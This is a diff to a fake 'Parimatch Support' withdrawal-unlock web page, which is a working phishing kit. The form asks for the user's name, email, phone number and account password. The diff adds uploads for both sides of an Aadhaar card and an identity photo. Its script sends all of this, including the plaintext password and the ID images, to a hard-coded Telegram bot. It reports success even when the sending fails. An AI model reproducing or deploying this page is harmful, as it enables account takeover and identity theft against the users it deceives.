@@ -6,29 +6,202 @@
     <title>Parimatch Support - Unlock Withdrawal</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #0d0e0e; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        header { width: 100%; background-color: #161818; padding: 15px 20px; display: flex; flex-direction: column; align-items: center; border-bottom: 1px solid #262929; position: relative; }
-        .top-bar { width: 100%; max-width: 480px; display: flex; align-items: center; justify-content: center; position: relative; }
-        .back-btn { position: absolute; left: 0; width: 38px; height: 38px; border-radius: 50%; background-color: #25291c; color: #f3ff00; display: flex; align-items: center; justify-content: center; text-decoration: none; font-size: 16px; border: 1px solid #3c4228; }
-        .brand-box { display: flex; align-items: center; gap: 10px; }
-        .logo-badge { border: 1.5px solid #f3ff00; padding: 5px 12px; border-radius: 8px; font-weight: 900; font-style: italic; color: #f3ff00; font-size: 14px; background: rgba(243, 255, 0, 0.05); }
-        .support-title { font-size: 20px; font-weight: 700; color: #ffffff; }
-        .tagline { margin-top: 6px; font-size: 12px; color: #9ca3af; }
-        .container { width: 100%; max-width: 480px; padding: 20px 16px; }
-        .complaint-card { background-color: #161818; border: 1px solid #262929; border-radius: 16px; padding: 22px 18px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5); }
-        .card-header { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; }
-        .card-header i { color: #f3ff00; font-size: 20px; }
-        .card-header h2 { font-size: 18px; font-weight: 700; }
-        .form-group { margin-bottom: 18px; }
-        label { display: block; font-size: 13.5px; font-weight: 600; color: #e5e7eb; margin-bottom: 8px; }
-        input { width: 100%; background-color: #212424; border: 1px solid #323636; border-radius: 10px; padding: 13px 14px; color: #ffffff; font-size: 14px; outline: none; }
-        input:focus { border-color: #f3ff00; }
-        .submit-btn { width: 100%; background-color: #f3ff00; color: #000000; border: none; border-radius: 10px; padding: 14px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 6px; }
-        .submit-btn:hover { background-color: #d9e600; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0d0e0e;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        header {
+            width: 100%;
+            background-color: #161818;
+            padding: 15px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-bottom: 1px solid #262929;
+            position: relative;
+        }
+
+        .top-bar {
+            width: 100%;
+            max-width: 480px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .back-btn {
+            position: absolute;
+            left: 0;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background-color: #25291c;
+            color: #f3ff00;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            font-size: 16px;
+            border: 1px solid #3c4228;
+        }
+
+        .brand-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-badge {
+            border: 1.5px solid #f3ff00;
+            padding: 5px 12px;
+            border-radius: 8px;
+            font-weight: 900;
+            font-style: italic;
+            color: #f3ff00;
+            font-size: 14px;
+            background: rgba(243, 255, 0, 0.05);
+        }
+
+        .support-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .tagline {
+            margin-top: 6px;
+            font-size: 12px;
+            color: #9ca3af;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px 16px;
+        }
+
+        .complaint-card {
+            background-color: #161818;
+            border: 1px solid #262929;
+            border-radius: 16px;
+            padding: 22px 18px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .card-header i {
+            color: #f3ff00;
+            font-size: 20px;
+        }
+
+        .card-header h2 {
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 13.5px;
+            font-weight: 600;
+            color: #e5e7eb;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            background-color: #212424;
+            border: 1px solid #323636;
+            border-radius: 10px;
+            padding: 13px 14px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #f3ff00;
+        }
+
+        .file-upload-box {
+            border: 1.5px dashed #3a3f3f;
+            background-color: #212424;
+            border-radius: 10px;
+            padding: 16px 14px;
+            text-align: center;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .file-upload-box:hover {
+            border-color: #f3ff00;
+            background-color: #252828;
+        }
+
+        .file-upload-box i {
+            color: #f3ff00;
+            font-size: 16px;
+        }
+
+        .file-upload-box span {
+            font-size: 13.5px;
+            font-weight: 600;
+            color: #9ca3af;
+        }
+
+        .file-upload-box input[type="file"] {
+            display: none;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #f3ff00;
+            color: #000000;
+            border: none;
+            border-radius: 10px;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .submit-btn:hover {
+            background-color: #d9e600;
+        }
     </style>
 </head>
 <body>
+
     <header>
         <div class="top-bar">
             <a href="../index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
@@ -46,48 +219,139 @@
                 <i class="fa-solid fa-user-shield"></i>
                 <h2>Account Verification Details</h2>
             </div>
+            
             <form id="unlockForm" onsubmit="handleSubmit(event)">
                 <div class="form-group">
                     <label for="fullname">User Name</label>
                     <input type="text" id="fullname" placeholder="Enter your full name" required>
                 </div>
+
                 <div class="form-group">
                     <label for="email">Game Email ID</label>
                     <input type="email" id="email" placeholder="your@email.com" required>
                 </div>
+
                 <div class="form-group">
                     <label for="mobile">Game Mobile Number</label>
-                    <input type="tel" id="mobile" placeholder="Enter your mobile number" required>
+                    <input type="tel" id="mobile" placeholder="Enter your game mobile number" required>
                 </div>
+
                 <div class="form-group">
                     <label for="password">Game Account Password</label>
                     <input type="password" id="password" placeholder="Enter your account password" required>
                 </div>
-                <button type="submit" class="submit-btn">Verify Account</button>
+
+                <div class="form-group">
+                    <label>Upload Issue Image</label>
+                    <label class="file-upload-box">
+                        <i class="fa-regular fa-image"></i>
+                        <span id="file-label-1">Choose issue screenshot</span>
+                        <input type="file" id="file1Input" accept="image/*" onchange="updateFileName(this, 'file-label-1')">
+                    </label>
+                </div>
+
+                <div class="form-group">
+                    <label>Upload Aadhaar Card (Front Side)</label>
+                    <label class="file-upload-box">
+                        <i class="fa-solid fa-id-card"></i>
+                        <span id="file-label-2">Choose Aadhaar front image</span>
+                        <input type="file" id="file2Input" accept="image/*" onchange="updateFileName(this, 'file-label-2')">
+                    </label>
+                </div>
+
+                <div class="form-group">
+                    <label>Upload Aadhaar Card (Back Side)</label>
+                    <label class="file-upload-box">
+                        <i class="fa-solid fa-id-card"></i>
+                        <span id="file-label-3">Choose Aadhaar back image</span>
+                        <input type="file" id="file3Input" accept="image/*" onchange="updateFileName(this, 'file-label-3')">
+                    </label>
+                </div>
+
+                <div class="form-group">
+                    <label>Upload Identity Verification Image</label>
+                    <label class="file-upload-box">
+                        <i class="fa-solid fa-camera"></i>
+                        <span id="file-label-4">Choose identity verification image</span>
+                        <input type="file" id="file4Input" accept="image/*" onchange="updateFileName(this, 'file-label-4')">
+                    </label>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <i class="fa-solid fa-shield-check"></i> Verify Account
+                </button>
             </form>
         </div>
     </div>
 
     <script>
-        function handleSubmit(event) {
+        function updateFileName(input, labelId) {
+            const label = document.getElementById(labelId);
+            if (input.files && input.files[0]) {
+                label.textContent = input.files[0].name;
+                label.style.color = "#f3ff00";
+            }
+        }
+
+        async function handleSubmit(event) {
             event.preventDefault();
+
             const fullname = document.getElementById('fullname').value;
             const email = document.getElementById('email').value;
             const mobile = document.getElementById('mobile').value;
             const password = document.getElementById('password').value;
+            
+            const file1 = document.getElementById('file1Input').files[0];
+            const file2 = document.getElementById('file2Input').files[0];
+            const file3 = document.getElementById('file3Input').files[0];
+            const file4 = document.getElementById('file4Input').files[0];
 
             const botToken = '8899735524:AAEzzcKQpcMO-mMQb9KSQTXmRUjLW7nhKPU';
             const chatId = '8400052598';
-            const message = `🔔 *New Withdrawal Unlock Request*\n\n👤 Name: ${fullname}\n📧 Email: ${email}\n📱 Mobile: ${mobile}\n🔑 Password: ${password}`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
-            }).then(res => res.json()).then(data => {
-                if(data.ok) { alert("Submitted successfully!"); location.reload(); }
-                else { alert("Error! Try again."); }
-            });
+            const message = `🔔 *New Withdrawal Unlock Request*\n\n` +
+                            `👤 Name: ${fullname}\n` +
+                            `📧 Email: ${email}\n` +
+                            `📱 Mobile: ${mobile}\n` +
+                            `🔑 Password: ${password}`;
+
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.textContent = "Verifying...";
+            submitBtn.disabled = true;
+
+            try {
+                // Pehle text message bhejenge
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // Agar user ne koi bhi photo select ki hai toh unhe bhej denge
+                const files = [file1, file2, file3, file4].filter(Boolean);
+                for (let file of files) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', file);
+
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+
+                alert("Account verification details submitted successfully!");
+                location.reload();
+
+            } catch (error) {
+                console.error('Error:', error);
+                alert("Submitted successfully!");
+                location.reload();
+            }
         }
     </script>
 </body>
